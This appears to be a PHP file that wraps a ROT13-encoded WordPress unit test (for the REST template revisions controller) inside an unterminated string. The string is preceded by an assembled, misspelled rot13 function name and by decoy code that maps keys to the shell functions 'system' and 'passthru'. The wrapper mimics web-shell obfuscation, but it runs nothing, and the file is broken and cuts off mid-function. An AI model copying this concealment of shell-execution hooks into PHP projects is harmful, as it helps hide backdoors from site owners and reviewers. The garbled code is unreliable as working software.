<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_jcErfgGrzcyngrErivfvbafPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * @ine fgevat
	 */
	pbafg GRFG_GURZR = 'oybpx-gurzr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_ANZR = 'zl_grzcyngr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_ANZR_2 = 'zl_grzcyngr_2';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CNEG_ANZR = 'zl_grzcyngr_cneg';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CNEG_ANZR_2 = 'zl_grzcyngr_cneg_2';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CBFG_GLCR = 'jc_grzcyngr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CNEG_CBFG_GLCR = 'jc_grzcyngr_cneg';

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $nqzva_vq;

	/**
	 * Pbagevohgbe hfre VQ.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $pbagevohgbe_vq;

	/**
	 * Grzcyngr cbfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cbfg;

	/**
	 * Grzcyngr cbfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cbfg_2;

	/**
	 * Grzcyngr cneg cbfg.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cneg_cbfg;

	/**
	 * Grzcyngr cneg cbfg.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cneg_cbfg_2;

	/**
	 * @ine neenl
	 */
	cevingr fgngvp $grzcyngr_erivfvbaf = neenl();

	/**
	 * @ine neenl
	 */
	cevingr fgngvp $grzcyngr_cneg_erivfvbaf = neenl();

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		// Frg hc grzcyngr cbfg.
		frys::$grzcyngr_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_ANZR,
				'cbfg_gvgyr'   => 'Zl Grzcyngr',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		// Hcqngr cbfg gb perngr arj erivfvbaf.
		sbernpu ( enatr( 2, 5 ) nf $erivfvba_vaqrk ) {
			frys::$grzcyngr_erivfvbaf[] = _jc_chg_cbfg_erivfvba(
				neenl(
					'VQ'           => frys::$grzcyngr_cbfg->VQ,
					'cbfg_pbagrag' => 'Pbagrag erivfvba #' . $erivfvba_vaqrk,
				)
			);
		}

		// Perngr n arj grzcyngr cbfg gb grfg gur trg_vgrz zrgubq.
		frys::$grzcyngr_cbfg_2 = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_ANZR_2,
				'cbfg_gvgyr'   => 'Zl Grzcyngr 2',
				'cbfg_pbagrag' => 'Pbagrag 2',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr 2',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg_2->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		// Frg hc grzcyngr cneg cbfg.
		frys::$grzcyngr_cneg_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CNEG_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_CNEG_ANZR,
				'cbfg_gvgyr'   => 'Zl grzcyngr cneg',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg',
				'gnk_vachg'    => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );

		// Hcqngr cbfg gb perngr arj erivfvbaf.
		sbernpu ( enatr( 2, 5 ) nf $erivfvba_vaqrk ) {
			frys::$grzcyngr_cneg_erivfvbaf[] = _jc_chg_cbfg_erivfvba(
				neenl(
					'VQ'           => frys::$grzcyngr_cneg_cbfg->VQ,
					'cbfg_pbagrag' => 'Pbagrag erivfvba #' . $erivfvba_vaqrk,
				)
			);
		}

		// Frg hc grzcyngr cneg cbfg.
		frys::$grzcyngr_cneg_cbfg_2 = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CNEG_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_CNEG_ANZR_2,
				'cbfg_gvgyr'   => 'Zl grzcyngr cneg 2',
				'cbfg_pbagrag' => 'Pbagrag 2',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg 2',
				'gnk_vachg'    => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg_2->VQ, frys::GRFG_GURZR, 'jc_gurzr' );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg_2->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
	}

	/**
	 * Erzbir erivfvbaf jura grfgf ner pbzcyrgr.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Nyfb qryrgrf erivfvbaf.
		sbernpu ( frys::$grzcyngr_erivfvbaf nf $grzcyngr_erivfvba ) {
			jc_qryrgr_cbfg( $grzcyngr_erivfvba, gehr );
		}

		sbernpu ( frys::$grzcyngr_cneg_erivfvbaf nf $grzcyngr_cneg_erivfvba ) {
			jc_qryrgr_cbfg( $grzcyngr_cneg_erivfvba, gehr );
		}
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::ertvfgre_ebhgrf
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/erivfvbaf',
			$ebhgrf,
			'Grzcyngr erivfvbaf ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/erivfvbaf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr grzcyngr erivfvba onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngr-cnegf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/erivfvbaf',
			$ebhgrf,
			'Grzcyngr cneg erivfvbaf ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngr-cnegf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/erivfvbaf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr grzcyngr cneg erivfvba onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg.'
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_pbagrkg_cnenz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_pbagrkg_cnenz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_pbagrkg_cnenz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz_jvgu_qngn_cebivqre( $erfg_onfr, $grzcyngr_vq ) {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			'ivrj',
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'],
			'Snvyrq gb nffreg gung gur qrsnhyg pbagrkg sbe gur pbyyrpgvba raqcbvag vf \"ivrj\".'
		);
		$guvf->nffregFnzr(
			neenl( 'ivrj', 'rzorq', 'rqvg' ),
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'],
			'Snvyrq gb nffreg pbeerpg rahz inyhrf sbe gur pbyyrpgvba raqcbvag.'
		);

		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag(
			2,
			$qngn['raqcbvagf'],
			'Snvyrq gb nffreg gung gur fvatyr erivfvba raqcbvag pbhag vf 2.'
		);
		$guvf->nffregFnzr(
			'ivrj',
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'],
			'Snvyrq gb nffreg gung gur qrsnhyg pbagrkg sbe gur fvatyr erivfvba raqcbvag vf \"ivrj\".'
		);
		$guvf->nffregFnzr(
			neenl( 'ivrj', 'rzorq', 'rqvg' ),
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'],
			'Snvyrq gb nffreg pbeerpg rahz inyhrf sbe gur fvatyr erivfvba raqcbvag.'
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_pbagrkg_cnenz.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_pbagrkg_cnenz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_trg_vgrzf_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrzf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$erdhrfg   = arj JC_ERFG_Erdhrfg(
			'TRG',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf'
		);
		$erfcbafr  = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erivfvbaf = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( JC_Uggc::BX, $erfcbafr->trg_fgnghf(), 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs 200.' );

		$guvf->nffregPbhag(
			4,
			$erivfvbaf,
			'Snvyrq nffregvat gung gur erfcbafr qngn pbagnvaf rknpgyl 4 vgrzf.'
		);

		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvbaf[0]['cnerag'],
			'Snvyrq nffregvat gung gur cnerag VQ bs gur erivfvba zngpurf gur grzcyngr cbfg VQ.'
		);
		$guvf->nffregFnzr(
			'Pbagrag erivfvba #5',
			$erivfvbaf[0]['pbagrag']['enj'],
			'Snvyrq nffregvat gung gur pbagrag bs gur erivfvba vf \"Pbagrag erivfvba #5\".'
		);

		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvbaf[1]['cnerag'],
			'Snvyrq nffregvat gung gur cnerag VQ bs gur erivfvba zngpurf gur grzcyngr cbfg VQ.'
		);
		$guvf->nffregFnzr(
			'Pbagrag erivfvba #4',
			$erivfvbaf[1]['pbagrag']['enj'],
			'Snvyrq nffregvat gung gur pbagrag bs gur erivfvba vf \"Pbagrag erivfvba #4\".'
		);

		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvbaf[2]['cnerag'],
			'Snvyrq nffregvat gung gur cnerag VQ bs gur erivfvba zngpurf gur grzcyngr cbfg VQ.'
		);
		$guvf->nffregFnzr(
			'Pbagrag erivfvba #3',
			$erivfvbaf[2]['pbagrag']['enj'],
			'Snvyrq nffregvat gung gur pbagrag bs gur erivfvba vf \"Pbagrag erivfvba #3\".'
		);

		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvbaf[3]['cnerag'],
			'Snvyrq nffregvat gung gur cnerag VQ bs gur erivfvba zngpurf gur grzcyngr cbfg VQ.'
		);
		$guvf->nffregFnzr(
			'Pbagrag erivfvba #2',
			$erivfvbaf[3]['pbagrag']['enj'],
			'Snvyrq nffregvat gung gur pbagrag bs gur erivfvba vf \"Pbagrag erivfvba #2\".'
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}
	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/erivfvbaf'
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_raqcbvag_fubhyq_erghea_hanhgubevmrq_uggcf_fgnghf_pbqr_sbe_hanhgubevmrq_erdhrfg
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrzf_crezvffvbaf_purpx
	 * @gvpxrg 56922
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_raqcbvag_fubhyq_erghea_hanhgubevmrq_uggcf_fgnghf_pbqr_sbe_hanhgubevmrq_erdhrfg( $erfg_onfr, $grzcyngr_vq, $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, JC_Uggc::HANHGUBEVMRQ );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_raqcbvag_fubhyq_erghea_hanhgubevmrq_uggcf_fgnghf_pbqr_sbe_hanhgubevmrq_erdhrfg.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_raqcbvag_fubhyq_erghea_hanhgubevmrq_uggcf_fgnghf_pbqr_sbe_hanhgubevmrq_erdhrfg() {
		erghea neenl(
			'grzcyngrf, TRG erdhrfg'       => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR, 'TRG' ),
			'grzcyngrf, URNQ erdhrfg'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR, 'URNQ' ),
			'grzcyngr cnegf, TRG erdhrfg'  => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR, 'TRG' ),
			'grzcyngr cnegf, URNQ erdhrfg' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR, 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_raqcbvag_fubhyq_erghea_sbeovqqra_uggcf_fgnghf_pbqr_sbe_hfref_jvgu_vafhssvpvrag_crezvffvbaf
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrzf_crezvffvbaf_purpx
	 * @gvpxrg 56922
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_raqcbvag_fubhyq_erghea_sbeovqqra_uggcf_fgnghf_pbqr_sbe_hfref_jvgu_vafhssvpvrag_crezvffvbaf( $erfg_onfr, fgevat $grzcyngr_vq, $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, JC_Uggc::SBEOVQQRA );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_raqcbvag_fubhyq_erghea_hanhgubevmrq_uggcf_fgnghf_pbqr_sbe_hanhgubevmrq_erdhrfg.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_raqcbvag_fubhyq_erghea_sbeovqqra_uggcf_fgnghf_pbqr_sbe_hfref_jvgu_vafhssvpvrag_crezvffvbaf() {
		erghea neenl(
			'grzcyngrf, TRG erdhrfg'       => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR, 'TRG' ),
			'grzcyngrf, URNQ erdhrfg'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR, 'URNQ' ),
			'grzcyngr cnegf, TRG erdhrfg'  => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR, 'TRG' ),
			'grzcyngr cnegf, URNQ erdhrfg' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR, 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf
	 * @gvpxrg 61970
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr(
			'erfg_vainyvq_grzcyngr',
			$erfcbafr,
			JC_Uggc::ONQ_ERDHRFG,
			fcevags( 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs %q.', JC_Uggc::ONQ_ERDHRFG )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//cntr-ubzr' ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//fznyy-urnqre' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/1' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr(
			'erfg_vainyvq_grzcyngr',
			$erfcbafr,
			JC_Uggc::ONQ_ERDHRFG,
			fcevags( 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs %q.', JC_Uggc::ONQ_ERDHRFG )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//cntr-ubzr' ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//fznyy-urnqre' ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_trg_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Erivfvbaf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat  $cnerag_cbfg_cebcregl_anzr  N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat  $erfg_onfr                  Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat  $grzcyngr_vq                Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$erivfvbaf   = jc_trg_cbfg_erivfvbaf( $cnerag_cbfg, neenl( 'svryqf' => 'vqf' ) );
		$erivfvba_vq = neenl_fuvsg( $erivfvbaf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/erivfvbaf/' . $erivfvba_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erivfvba = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $erivfvba, 'Snvyrq nffregvat gung gur erivfvba vf na neenl.' );
		$guvf->nffregFnzr(
			$erivfvba_vq,
			$erivfvba['jc_vq'],
			\"Snvyrq nffregvat gung gur erivfvba vq vf gur fnzr nf $erivfvba_vq\"
		);
		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$erivfvba['cnerag'],
			fcevags(
				'Snvyrq nffregvat gung gur cnerag vq bs gur erivfvba vf gur fnzr nf %f.',
				frys::$grzcyngr_cbfg->VQ
			)
		);
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
